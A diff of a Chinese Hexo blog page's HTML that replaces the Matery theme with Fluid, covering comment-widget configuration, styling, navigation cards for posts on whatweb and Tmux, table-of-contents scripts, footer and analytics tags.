+          app_id: "zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz",
+          app_key: "oFcTVTBJYrfsIGdYNnoWMVJ9",
+          placeholder: "留下你的足迹",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
       });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
 
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
 
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/tags/OSCP/">
-                                    <span class="chip bg-color">OSCP</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
-</div>
-
-                </div>
-            </div>
+              </article>
             
+          </article>
         </div>
+      </div>
     </div>
-
     
-
-    
-
-    
-
-    
-
-    
-        <style>
-    .valine-card {
-        margin: 1.5rem auto;
-    }
-
-    .valine-card .card-content {
-        padding: 20px 20px 5px 20px;
-    }
-
-    #vcomments textarea {
-        box-sizing: border-box;
-        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
-    }
-
-    #vcomments p {
-        margin: 2px 2px 10px;
-        font-size: 1.05rem;
-        line-height: 1.78rem;
-    }
-
-    #vcomments blockquote p {
-        text-indent: 0.2rem;
-    }
-
-    #vcomments a {
-        padding: 0 2px;
-        color: #4cbf30;
-        font-weight: 500;
-        text-decoration: none;
-    }
-
-    #vcomments img {
-        max-width: 100%;
-        height: auto;
-        cursor: pointer;
-    }
-
-    #vcomments ol li {
-        list-style-type: decimal;
-    }
-
-    #vcomments ol,
-    ul {
-        display: block;
-        padding-left: 2em;
-        word-spacing: 0.05rem;
-    }
-
-    #vcomments ul li,
-    ol li {
-        display: list-item;
-        line-height: 1.8rem;
-        font-size: 1rem;
-    }
-
-    #vcomments ul li {
-        list-style-type: disc;
-    }
-
-    #vcomments ul ul li {
-        list-style-type: circle;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    #vcomments table, th, td {
-        border: 0;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments h1 {
-        font-size: 1.85rem;
-        font-weight: bold;
-        line-height: 2.2rem;
-    }
-
-    #vcomments h2 {
-        font-size: 1.65rem;
-        font-weight: bold;
-        line-height: 1.9rem;
-    }
-
-    #vcomments h3 {
-        font-size: 1.45rem;
-        font-weight: bold;
-        line-height: 1.7rem;
-    }
-
-    #vcomments h4 {
-        font-size: 1.25rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    #vcomments h5 {
-        font-size: 1.1rem;
-        font-weight: bold;
-        line-height: 1.4rem;
-    }
-
-    #vcomments h6 {
-        font-size: 1rem;
-        line-height: 1.3rem;
-    }
-
-    #vcomments p {
-        font-size: 1rem;
-        line-height: 1.5rem;
-    }
-
-    #vcomments hr {
-        margin: 12px 0;
-        border: 0;
-        border-top: 1px solid #ccc;
-    }
-
-    #vcomments blockquote {
-        margin: 15px 0;
-        border-left: 5px solid #42b983;
-        padding: 1rem 0.8rem 0.3rem 0.8rem;
-        color: #666;
-        background-color: rgba(66, 185, 131, .1);
-    }
-
-    #vcomments pre {
-        font-family: monospace, monospace;
-        padding: 1.2em;
-        margin: .5em 0;
-        background: #272822;
-        overflow: auto;
-        border-radius: 0.3em;
-        tab-size: 4;
-    }
-
-    #vcomments code {
-        font-family: monospace, monospace;
-        padding: 1px 3px;
-        font-size: 0.92rem;
-        color: #e96900;
-        background-color: #f8f8f8;
-        border-radius: 2px;
-    }
-
-    #vcomments pre code {
-        font-family: monospace, monospace;
-        padding: 0;
-        color: #e8eaf6;
-        background-color: #272822;
-    }
-
-    #vcomments pre[class*="language-"] {
-        padding: 1.2em;
-        margin: .5em 0;
-    }
-
-    #vcomments code[class*="language-"],
-    pre[class*="language-"] {
-        color: #e8eaf6;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-
-    #vcomments b,
-    strong {
-        font-weight: bold;
-    }
-
-    #vcomments dfn {
-        font-style: italic;
-    }
-
-    #vcomments small {
-        font-size: 85%;
-    }
-
-    #vcomments cite {
-        font-style: normal;
-    }
-
-    #vcomments mark {
-        background-color: #fcf8e3;
-        padding: .2em;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-</style>
-
-<div class="card valine-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="vcomments" class="card-content" style="display: grid">
-    </div>
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
 </div>
 
-<script src="/libs/valine/av-min.js"></script>
-<script src="/libs/valine/Valine.min.js"></script>
-<script>
-    new Valine({
-        el: '#vcomments',
-        appId: 'zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz',
-        appKey: 'oFcTVTBJYrfsIGdYNnoWMVJ9',
-        notify: 'false' === 'true',
-        verify: 'false' === 'true',
-        visitor: 'true' === 'true',
-        avatar: 'mm',
-        pageSize: '10',
-        lang: 'zh-cn',
-        placeholder: 'just go go'
-    });
-</script>
-
+      </div>
     
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2020/09/03/whatweb/">
-                    <div class="card-image">
-                        
-                        <img src="https://s1.ax1x.com/2020/09/03/wPuRAS.png" class="responsive-img" alt="网站指纹识别-whatweb">
-                        
-                        <span class="card-title">网站指纹识别-whatweb</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            whatweb 学习总结Whatweb 是一款优秀的基于 Ruby 开发的网络指纹识别软件，不但拥有丰富的命令参数可以自定义探测过程，还有上千个集成的插件供我们使用。
-whatweb介绍
-拥有超过 1700+ 个插件
-若网站返回 302，会
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-09-03
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            uaa
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/whatweb/">
-                        <span class="chip bg-color">whatweb</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/09/01/Tmux/">
-                    <div class="card-image">
-                        
-                        <img src="https://infu.ir/wp-content/uploads/2018/07/tmux-dribbble.png" class="responsive-img" alt="Tmux学习记录">
-                        
-                        <span class="card-title">Tmux学习记录</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            学习使用Tmux我为什么要学习Tmux，我想在命令行模式下同时打开多个终端，以及如何在ssh远程连接时进行翻页，满足我的日常需求。
-简介tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-01
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            uaa
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Linux/">
-                        <span class="chip bg-color">Linux</span>
-                    </a>
-                    
-                    <a href="/tags/Tmux/">
-                        <span class="chip bg-color">Tmux</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-    </div>
-</article>
-
+  </div>
 </div>
 
-
-<script>
-    $('#articleContent').on('copy', function (e) {
-        // IE8 or earlier browser is 'undefined'
-        if (typeof window.getSelection === 'undefined') return;
-
-        var selection = window.getSelection();
-        // if the selection is short let's not annoy our users.
-        if (('' + selection).length < Number.parseInt('120')) {
-            return;
-        }
-
-        // create a div outside of the visible area and fill it with the selected text.
-        var bodyElement = document.getElementsByTagName('body')[0];
-        var newdiv = document.createElement('div');
-        newdiv.style.position = 'absolute';
-        newdiv.style.left = '-99999px';
-        bodyElement.appendChild(newdiv);
-        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
-
-        // we need a <pre> tag workaround.
-        // otherwise the text inside "pre" loses all the line breaks!
-        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
-            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
-        }
-
-        var url = document.location.href;
-        newdiv.innerHTML += '<br />'
-            + '来源: wiki<br />'
-            + '文章作者: uaa<br />'
-            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
-
-        selection.selectAllChildren(newdiv);
-        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
-    });
-</script>
+<!-- Custom -->
 
 
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+    
+  </main>
 
-<!-- 代码语言 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-<!-- 代码块折行 -->
-
-<style type="text/css">
-code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-</style>
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
-</div>
+  
 
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4, h5, h6'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4, h5, h6').each(function () {
-            $(this).attr('id', tocHeading + (++i));
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-
-    
-
-</main>
-
-
-
-
-    <footer class="page-footer bg-color">
-    
-    <div class="container row center-align" style="margin-bottom: 15px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            <span id="year">2020</span>
-            <a href="/about" target="_blank">uaa</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            <br>
-            
-            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">60.1k</span>&nbsp;字
-            
-            
-            
-            
-            
-            
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
-            </span>
-            
-            
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
-            </span>
-            
-            <br>
-            
-            <span id="sitetime">载入运行时间...</span>
-            <script>
-                function siteTime() {
-                    var seconds = 1000;
-                    var minutes = seconds * 60;
-                    var hours = minutes * 60;
-                    var days = hours * 24;
-                    var years = days * 365;
-                    var today = new Date();
-                    var startYear = "2020";
-                    var startMonth = "1";
-                    var startDate = "1";
-                    var startHour = "0";
-                    var startMinute = "0";
-                    var startSecond = "0";
-                    var todayYear = today.getFullYear();
-                    var todayMonth = today.getMonth() + 1;
-                    var todayDate = today.getDate();
-                    var todayHour = today.getHours();
-                    var todayMinute = today.getMinutes();
-                    var todaySecond = today.getSeconds();
-                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
-                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
-                    var diff = t2 - t1;
-                    var diffYears = Math.floor(diff / years);
-                    var diffDays = Math.floor((diff / days) - diffYears * 365);
-                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
-                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
-                        minutes);
-                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
-                        diffMinutes * minutes) / seconds);
-                    if (startYear == todayYear) {
-                        document.getElementById("year").innerHTML = todayYear;
-                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
-                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
-                    } else {
-                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
-                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
-                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
-                    }
-                }
-                setInterval(siteTime, 1000);
-            </script>
-            
-            <br>
-            
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-</div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
 </footer>
 
-<div class="progress-bar"></div>
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
 
 
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script src="/js/search.js"></script>
-<script type="text/javascript">
-$(function () {
-    searchFunc("/search.xml", 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
+  
+    <script  src="/js/lazyload.js" ></script>
+  
 
 
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
 
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "OSCP指南&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
     <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?d8cb5311ff5a7a66ad88e94f5290da89";
         var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
-</script>
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
+  
 
-    
+  
 
-    
+  
 
-    
+  
 
-    
+  
 
-    
 
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
+
+
 
 </body>
-
 </html>
